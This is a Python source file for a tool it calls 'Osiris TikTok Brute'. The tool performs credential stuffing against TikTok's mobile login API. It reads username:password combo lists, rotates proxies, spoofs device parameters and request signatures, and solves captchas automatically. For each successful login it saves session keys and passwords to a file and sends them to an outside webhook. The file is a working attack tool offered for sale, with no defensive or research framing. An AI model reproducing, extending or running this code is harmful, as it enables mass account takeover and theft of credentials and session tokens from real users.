from pickle import FALSE
import threading
import requests
import hashlib
import random
import cursor; cursor.hide()
import time
import json
import os

from pystyle import *
from utils.api import *
from urllib.parse import urlencode

class Bruteforce:
    def __init__(self, device, proxy):
        self.device      = device
        self.proxy       = proxy
        self.checks      = 0
    
    def __solve_captcha(self) -> None:
        return Captcha(
            did = self.device["device_id"],
            iid = self.device["install_id"],
        ).solve_captcha()
    
    def __base_params(self) -> json:
        return urlencode({
            "passport-sdk-version" : 17,
            "os_api"               : 25,
            "device_type"          : "SM-G973N",
            "ssmix"                : "a",
            "manifest_version_code": 160904,
            "dpi"                  : 320,
            "carrier_region"       : "IE",
            "uoo"                  : 0,
            "region"               : "US",
            "carrier_region_v2"    : 310,
            "app_name"             : "musically_go",
            "version_name"         : "16.9.4",
            "timezone_offset"      : 7200,
            "ts"                   : int(time.time()),
            "ab_version"           : "16.9.4",
            "pass-route"           : 1,
            "cpu_support64"        : "false",
            "pass-region"          : 1,
            "storage_type"         : 0,
            "ac2"                  : "wifi",
            "ac"                   : "wifi",
            "app_type"             : "normal",
            "host_abi"             : "armeabi-v7a",
            "channel"              : "googleplay",
            "update_version_code"  : 160904,
            "_rticket"             : int(time.time() * 1000),
            "device_platform"      : "android",
            "iid"                  : self.device["install_id"],
            "build_number"         : "16.9.4",
            "locale"               : "en",
            "op_region"            : "IE",
            "version_code"         : 160904,
            "timezone_name"        : "Africa/Harare",
            "cdid"                 : self.device["cdid"], 
            "openudid"             : self.device["openudid"], 
            "sys_region"           : "US",
            "device_id"            : self.device["device_id"],
            "app_language"         : "en",
            "resolution"           : "900*1600",
            "device_brand"         : "samsung",
            "language"             : "en",
            "os_version"           : "7.1.2",
            "aid"                  : 1340 
        })

    def __base_headers(self, params: str, payload: str) -> dict:
        sig = Utils._sig(
            params = params,
            body   = payload
        )
        
        return {
            "x-ss-stub"             : hashlib.md5(payload.encode()).hexdigest(),
            "accept-encoding"       : "gzip",
            "passport-sdk-version"  : "17",
            "sdk-version"           : "2",
            "x-ss-req-ticket"       : str(int(time.time() * 1000)),
            "x-gorgon"              : sig["X-Gorgon"],
            "x-khronos"             : sig["X-Khronos"],
            "content-type"          : "application/x-www-form-urlencoded; charset=UTF-8",
            "host"                  : "api16-va.tiktokv.com",
            "connection"            : "Keep-Alive",
            "user-agent"            : "okhttp/3.10.0.1"
        }
    
    def __base_payload(self, mode: str, user: str, password: str) -> dict:
        
        return urlencode({
            mode: Utils._xor(user),
            "password": Utils._xor(password),
            "mix_mode": 1,
            "account_sdk_source": "app"
        })

    def login(self, mode: str, username: str, password: str) -> requests.Response:
        for x in range(2):
            # captcha_start = time.time()
            
            if self.__solve_captcha()["code"] == 200:
                try:
                    # print(Utils.sprint("*", "x", "Solved captcha {}{}s{}".format(Col.blue, round(time.time() - captcha_start, 1), Col.reset)))
                    params  = self.__base_params()
                    payload = self.__base_payload(mode, username, password)
                    headers = self.__base_headers(params, payload)
                    
                    return requests.post(
                        url     = (
                            "https://api16-va.tiktokv.com/passport/user/login?"
                                + params
                        ), 
                        data    = payload, 
                        headers = headers, 
                        proxies = {
                            'http' : f'http://{self.proxy}',
                            'https': f'http://{self.proxy}'
                        }
                    )
                except:
                    continue

class Api:
    def __init__(self, device: dict, proxy: str, cookies: dict):
        self.device      = device
        self.proxy       = proxy
        self.cookies     = "; ".join([str(x)+"="+str(y) for x,y in cookies.items()])
    
    def __base_headers(self, params: dict) -> dict:
        sig = Utils._sig(
            params = params
        )
        
        return {
            "accept-encoding"       : "gzip",
            "sdk-version"           : "2",
            # "x-tt-token": "03d2feece922c427e2a16f1a368c31b06e056e5ed1d9dc9879a5dc9181786fddac081c5f9366cc365fc8a8a7af3fb6dfd11290c4a65cb80de625ad7e7be790ff7b11f381084069119cd26173686d3b1f21652990d55391550bd94e26ab8b98621301e-CkBlMDMxOTViYWQ4NTQyMzBhMGNiODA4ZDBmODA3Mjc0ZjA1YjRmM2JhOTMxNjM4MjY0YTY0NWRhYjJmMzY3MmRk-2.0.0",
            "passport-sdk-version"  : "17",
            "x-ss-req-ticket"       : str(int(time.time() * 1000)),
            "cookie"                : self.cookies,
            "x-gorgon"              : sig["X-Gorgon"],
            "x-khronos"             : sig["X-Khronos"],
            "host"                  : "api16-normal-c-useast1a.tiktokv.com",
            "connection"            : "Keep-Alive",
            "user-agent"            : "okhttp/3.10.0.1"
        }
    
    def __base_params(self) -> json:
        
        return urlencode({
            "is_after_login"        : 1,
            "storage_type"          : 0,
            "manifest_version_code" : 160904,
            "_rticket"              : int(time.time() * 1000),
            "current_region"        : "FR",
            "app_language"          : "fr",
            "app_type"              : "normal",
            "iid"                   : self.device["install_id"],
            "channel"               : "googleplay",
            "device_type"           : "SM-G973N",
            "language"              : "fr",
            "cpu_support64"         : "true",
            "host_abi"              : "armeabi-v7a",
            "locale"                : "fr",
            "resolution"            : "1600*900",
            "openudid"              : self.device["openudid"], 
            "update_version_code"   : 160904,
            "ac2"                   : "wifi5g",
            "cdid"                  : self.device["cdid"], 
            "sys_region"            : "FR",
            "os_api"                : 28,
            "uoo"                   : 0,
            "timezone_name"         : "Africa/Harare",
            "dpi"                   : 320,
            "residence"             : "IE",
            "carrier_region"        : "IE",
            "ac"                    : "wifi",
            "device_id"             : self.device["device_id"],
            "pass-route"            : 1,
            "os_version"            : 9,
            "timezone_offset"       : 7200,
            "version_code"          : 160904,
            "carrier_region_v2"     : "208",
            "app_name"              : "musically_go",
            "ab_version"            : "16.9.4",
            "version_name"          : "16.9.4",
            "device_brand"          : "samsung",
            "op_region"             : "IE",
            "ssmix"                 : "a",
            "pass-region"           : 1,
            "device_platform"       : "android",
            "build_number"          : "16.9.4",
            "region"                : "FR",
            "aid"                   : 1340,
            "ts"                    : int(time.time()),
        })
        
    def get_userinfo(self):
        params = self.__base_params()
        
        return requests.get(
            url = (
                "https://api16-normal-c-useast1a.tiktokv.com/aweme/v1/user/profile/self/?"
                    + params
            ),
            headers = self.__base_headers(params),
            proxies = {
                'http' : f'http://{self.proxy}',
                'https': f'http://{self.proxy}'
            }
        )

class ThreadsHandler:
    def __init__(self, combos: list)-> None:
        self.config   = json.loads(open("data/config.json").read())
        self.threads  = self.config["threads"]
        self.mode     = self.config["mode"]
        self.webhook  = self.config["webhook"]["link"] if self.config["webhook"]["enabled"] is True else None
        self.log_file = self.config["logging"]["file"] if self.config["logging"]["enabled"] is True else None
        self.proxies  = open(r"./data/proxies.txt").read().splitlines()
        self.combos   = combos
        self.loggedin = [1381, 2033, 2046]
        self.captcha  = [17, 7]
        self.to_check = len(self.combos)
        self.success  = 0
        self.fails    = 0

    def __login_request(self, username: str, password: str) -> bool and dict:
        try:
            proxy          = random.choice(self.proxies)
            device         = Xlog(proxy).validate_device()
            login_response = Bruteforce(device, proxy).login(self.mode, username, password)
            
            if self.log_file is not None:
                with open(self.log_file, "a") as f:
                    f.write(str(login_response.text) + "\n")
            
            if login_response.json()['data'].get('error_code') is None:
                try:
                    info = Api(device, proxy, {"sessionid": login_response.json()['data']['session_key']}).get_userinfo()
                    # print(info.text)
                    
                    return True, login_response.json(), info.json()
                except Exception:
                    pass
                
                return True, login_response.json(), {}, {}
            
            elif login_response.json()['data'].get('error_code') in self.loggedin:
                return True, login_response.json()
            
            elif login_response.json()['data'].get('error_code') in self.captcha:
                try:
                    proxy          = random.choice(self.proxies)
                    device         = Xlog(proxy).validate_device()
                    login_response = Bruteforce(device, proxy).login(self.mode, username, password)
                    
                    if self.log_file is not None:
                        with open(self.log_file, "a") as f:
                            f.write(str(login_response.text) + "\n")
                    
                    if login_response.json()['data'].get('error_code') is None:
                        try:
                            info = Api(device, proxy, {"sessionid": login_response.json()['data']['session_key']}).get_userinfo()
                            # print(info.text)
                            
                            return True, login_response.json(), info.json()
                        except Exception:
                            pass
                        
                        return True, login_response.json(), {}, {}
                    
                    elif login_response.json()['data'].get('error_code') in self.loggedin:
                        return True, login_response.json(), {}
                    
                    else:
                        return False, {}, {}
                    
                except Exception as e:
                    return False, {}, {}
            
            else:
                return False, {}, {}
            
        except Exception as e:
            return False, {}, {}
    
    def __title_loop(self):
        if os.name == "nt":
            while True:
                os.system(f"title Osiris Brute ^| hits: {self.success} ^| fails: {self.fails} ^| eta: {self.success + self.fails}/{self.to_check}")
                time.sleep(0.5)
                
    def __send_webhook(self, login_data: dict, account_data: dict, email: str, password: str) -> None:
        try:
            _username  = account_data['user']['unique_id']
            _followers = account_data['user']['follower_count']
            _avatar    = account_data['user']['share_info']['share_image_url']['url_list'][0]
            
            requests.post(
                url = self.webhook,
                json = {
                    "content": None,
                    "embeds": [
                        {
                            "title": "Osiris TikTok Brute",
                            "description": f"**profile**: https://tiktok.com/@{_username}\n**password**:  `{password}`\n**email**:  `{email}`\n**Stats: ** flw - `{_followers}` | verified - `{login_data['data']['user_verified']}`",
                            "color":12714239,
                            "image":{
                                "url":"https://s4.gifyu.com/images/zefezfzefzef.gif"
                                },
                            "thumbnail":
                                {
                                    "url": _avatar
                                    }
                        }
                    ],
                "attachments":[]
                }
            )
        except Exception:
            pass
    
    def __brute_account(self, username: str, password: str) -> bool:
        success, login_data, account_data = self.__login_request(username, password)
        # print(login_data)
        if success is True:
            self.success += 1
            try:
                with open("data/hits.txt", "a") as f:
                    f.write(f"@{login_data['data']['name']}| {login_data['data']['session_key']} | {username}:{password} - Followers: n/a - Verified: {login_data['data']['user_verified']} - Email: {login_data['data']['email_collected']} - Phone: {login_data['data']['phone_collected']}\n")
                
                email  = f"{Col.blue}{username}{Col.reset}:{Col.blue}{password}{Col.reset}"
                factor = Utils._factor(email)

                print(Utils.sprint('*', 'Success -', f"{email} {' ' * factor} - Verified: {login_data['data']['user_verified']} - Email: {login_data['data']['email_collected']} - Phone: {login_data['data']['phone_collected']}"))
                
                if self.webhook is not None:
                    if account_data != {}:
                        
                        if self.mode != "email":
                            _email = None
                        else:
                            _email = username
                        self.__send_webhook(login_data, account_data, _email, password)
                
                # if self.webhook is not None:
                #     requests.post(
                #         url     = self.webhook,
                #         data    = json.dumps({
                #             "content": f"bruted - **{username}**:**{password}**"
                #         }),
                #         headers = {"Content-Type": "application/json"}
                #     )
                
            except Exception as e:
                
                email  = f"{Col.blue}{username}{Col.reset}:{Col.blue}{password}{Col.reset}"
                factor = Utils._factor(email)
                
                print(Utils.sprint("x", "Error   -", f"{email} {' ' * factor} | possible brute"))
                
                with open("data/hits.txt") as x:
                    x.write(email)
                    
                if self.webhook is not None:
                    requests.post(
                        url     = self.webhook,
                        data    = json.dumps({
                            "content": f"**{username}** | **{password}**"
                        }),
                        headers = {"Content-Type": "application/json"}
                    )
        
        else:
            self.fails += 1
            email  = f"{Col.blue}{username}{Col.reset}:{Col.blue}{password}{Col.reset}"
            factor = Utils._factor(email)
            print(Utils.sprint("x", "Error   -", f"{email} {' ' * factor} | Incorrect account or password"))
            # print(f"Error   - {username}:{password} | Incorrect account or password")
        
    def main(self):
        threading.Thread(target=self.__title_loop).start()
        
        index = 0
        while index < self.to_check:
            if threading.active_count() < self.threads:
                threading.Thread(
                    target = self.__brute_account, 
                    args = self.combos[index].split(":")
                ).start()
                index += 1
                
        
if __name__ == "__main__":
    
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print(Col.purple + Center.XCenter(f""" _____  _______ _____  ______ _____ _______\n|     | |______   |   |_____/   |   |______\n|_____| ______| __|__ |    \_ __|__ ______|""") + Col.reset); print("\n\n")
    print('this is the demo version, you have to purchase the tool')
    input()
    
    # combos = open(r"./data/combolist.txt").read().splitlines()
    # ThreadsHandler(combos).main()
